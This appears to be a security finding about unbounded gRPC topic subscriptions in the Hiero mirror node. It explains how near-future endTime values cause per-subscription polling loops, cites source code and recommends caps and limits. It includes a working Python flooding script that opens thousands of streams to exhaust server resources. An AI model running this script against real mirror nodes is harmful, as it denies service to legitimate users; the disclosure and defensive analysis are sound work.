### Title
Unbounded gRPC Subscriptions with Near-Future `endTime` Cause Linear Resource Exhaustion via Per-Subscription `pastEndTime()` Polling Loop

### Summary
Any unauthenticated client can open an unlimited number of `subscribeTopic` gRPC streams by multiplexing across many TCP connections, each carrying up to 5 concurrent calls. When each subscription carries an `endTime` set just slightly beyond the current time, `TopicMessageServiceImpl.pastEndTime()` creates a dedicated `RepeatSpec`-driven polling loop per subscription that calls `topicContext.isComplete()` on every `endTimeInterval` tick. Because there is no global or per-IP subscription cap, the aggregate scheduler load, thread-pool pressure, DB connection consumption, and memory footprint all scale linearly with the number of attacker-controlled subscriptions.

### Finding Description

**Entry point — no authentication or per-IP limit:**

`ConsensusController.subscribeTopic()` accepts any request without authentication or per-source-IP throttling. [1](#0-0) 

The only server-side guard is `maxConcurrentCallsPerConnection = 5`, which is a *per-TCP-connection* limit, not a per-IP or global limit. [2](#0-1) [3](#0-2) 

An attacker opening *K* TCP connections can therefore hold *5K* concurrent subscriptions simultaneously.

**Input validation allows near-future `endTime`:**

`TopicMessageFilter` only requires `endTime > startTime` and `startTime <= now()`. Setting `startTime = now` and `endTime = now + 1 ns` passes all validators. [4](#0-3) 

**Per-subscription `pastEndTime()` polling loop:**

For every subscription that carries a non-null `endTime`, `TopicMessageServiceImpl.pastEndTime()` instantiates a fresh `RepeatSpec` that fires every `endTimeInterval` (default **30 s**) and evaluates `topicContext.isComplete()` on each tick. [5](#0-4) 

`isComplete()` checks whether `endTime + endTimeInterval` is before `Instant.now()`: [6](#0-5) 

With `endTime = now + 1 ns`, the subscription stays alive for the full `endTimeInterval` window (~30 s) before `isComplete()` finally returns `true`. During that window each subscription holds:
- Its own `RepeatSpec` scheduler slot on `Schedulers.boundedElastic()`
- A live `PollingTopicMessageRetriever` polling loop (also per-subscription, with its own `RepeatSpec`)
- A safety-check `Mono.delay(1 s)` that fires a DB query after 1 second
- A subscription to the shared topic listener (Redis/poll)
- An increment to `subscriberCount` and associated Micrometer gauge overhead [7](#0-6) 

**Aggregate effect:** With *N* concurrent attacker subscriptions, the server runs *N* independent `pastEndTime()` polling loops, *N* retriever polling loops, *N* safety-check DB queries, and holds *N* listener subscriptions — all scaling linearly with no upper bound.

### Impact Explanation

- **Scheduler exhaustion:** `Schedulers.boundedElastic()` has a finite thread ceiling. Thousands of concurrent `RepeatSpec` tasks can saturate it, starving legitimate subscribers.
- **DB connection pool exhaustion:** Each subscription's retriever and safety-check issue independent DB queries. The gRPC DB connection pool (monitored via `hikaricp_connections_active`) can be driven to 100% utilization, causing legitimate queries to queue or time out.
- **Memory pressure:** Each `TopicContext`, `PollingContext`, and associated Reactor operator chain allocates heap. Thousands of subscriptions cause sustained GC pressure.
- **Griefing with no economic cost to attacker:** The attacker pays only TCP connection overhead; no Hedera fees are involved.

Severity: **Medium** — service degradation / partial denial of service for legitimate subscribers; no data corruption or credential exposure.

### Likelihood Explanation

- No authentication is required; any internet-reachable client qualifies.
- Opening thousands of TCP connections and multiplexing 5 gRPC streams each is trivially achievable with standard gRPC client libraries (e.g., `grpc-java`, `grpcurl` in a loop, or a simple Go/Python script).
- The attack is repeatable and stateless: the attacker simply reconnects after each 30-second subscription window expires.
- No special knowledge of the system internals is needed beyond the public protobuf API definition.

### Recommendation

1. **Global subscription cap:** Enforce a configurable maximum on `subscriberCount` (already tracked via `AtomicLong`) and reject new subscriptions with `RESOURCE_EXHAUSTED` when the cap is reached.
2. **Per-IP connection/subscription limit:** Add a gRPC server interceptor that tracks active streams per remote IP and rejects excess connections.
3. **Minimum `endTime` window:** Reject subscriptions where `endTime - now < some_minimum_duration` (e.g., 1 s) to prevent trivially short-lived subscriptions from being used as a rapid-reconnect amplifier.
4. **`endTimeInterval` lower bound:** The 30-second default means each near-future subscription occupies resources for 30 s. Reducing this value (or making `isComplete()` terminate the stream immediately when `endTime` is already past at subscription start) would shrink the attack window.

### Proof of Concept

```python
import grpc
import threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2, timestamp_pb2
import time

TARGET = "mirror-node-grpc-host:5600"
TOPIC_NUM = 1234          # any existing topic
NUM_CONNECTIONS = 500     # 500 TCP connections × 5 streams = 2500 subscriptions

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    now_ns = time.time_ns()
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM),
        consensusStartTime=timestamp_pb2.Timestamp(
            seconds=now_ns // 1_000_000_000,
            nanos=now_ns % 1_000_000_000),
        # endTime = now + 1 nanosecond → passes validation, keeps subscription
        # alive for the full endTimeInterval (~30s) before isComplete() fires
        consensusEndTime=timestamp_pb2.Timestamp(
            seconds=now_ns // 1_000_000_000,
            nanos=(now_ns % 1_000_000_000) + 1),
    )
    # Open 5 concurrent streams on this connection
    streams = [stub.subscribeTopic(query) for _ in range(5)]
    for s in streams:
        try:
            for _ in s:   # drain (will complete after ~30s)
                pass
        except Exception:
            pass

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

**Expected result:** The mirror-node gRPC process holds 2,500 concurrent subscriptions, each with its own `pastEndTime()` scheduler task, retriever polling loop, and safety-check DB query. DB connection utilization rises sharply (observable via the `GrpcHighDBConnections` alert rule), `boundedElastic` thread pool saturates, and legitimate subscriber latency increases or connections are refused.

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L43-53)
```java
    public void subscribeTopic(ConsensusTopicQuery request, StreamObserver<ConsensusTopicResponse> responseObserver) {
        final var disposable = Mono.fromCallable(() -> toFilter(request))
                .flatMapMany(topicMessageService::subscribeTopic)
                .map(this::toResponse)
                .onErrorMap(ProtoUtil::toStatusRuntimeException)
                .subscribe(responseObserver::onNext, responseObserver::onError, responseObserver::onCompleted);

        if (responseObserver instanceof ServerCallStreamObserver serverCallStreamObserver) {
            serverCallStreamObserver.setOnCancelHandler(disposable::dispose);
        }
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L31-34)
```java
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L43-51)
```java
    @AssertTrue(message = "End time must be after start time")
    public boolean isValidEndTime() {
        return endTime == null || endTime > startTime;
    }

    @AssertTrue(message = "Start time must be before the current time")
    public boolean isValidStartTime() {
        return startTime <= DomainUtils.now();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L59-92)
```java
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
        Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));

        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());

        Flux<TopicMessage> flux = historical
                .concatWith(Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext)))
                .filter(t -> {
                    TopicMessage last = topicContext.getLast();
                    return last == null || t.getSequenceNumber() > last.getSequenceNumber();
                });

        if (filter.getEndTime() != null) {
            flux = flux.takeWhile(t -> t.getConsensusTimestamp() < filter.getEndTime());
        }

        if (filter.hasLimit()) {
            flux = flux.take(filter.getLimit());
        }

        return topicExists(filter)
                .thenMany(flux.doOnNext(topicContext::onNext)
                        .doOnSubscribe(s -> subscriberCount.incrementAndGet())
                        .doFinally(s -> subscriberCount.decrementAndGet())
                        .doFinally(topicContext::finished));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L123-131)
```java
    private Flux<Object> pastEndTime(TopicContext topicContext) {
        if (topicContext.getFilter().getEndTime() == null) {
            return Flux.never();
        }

        return Flux.empty()
                .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                        .withFixedDelay(grpcProperties.getEndTimeInterval()));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-215)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
            }

            if (filter.getEndTime() < startTime) {
                return true;
            }

            return Instant.ofEpochSecond(0, filter.getEndTime())
                    .plus(grpcProperties.getEndTimeInterval())
                    .isBefore(Instant.now());
        }
```
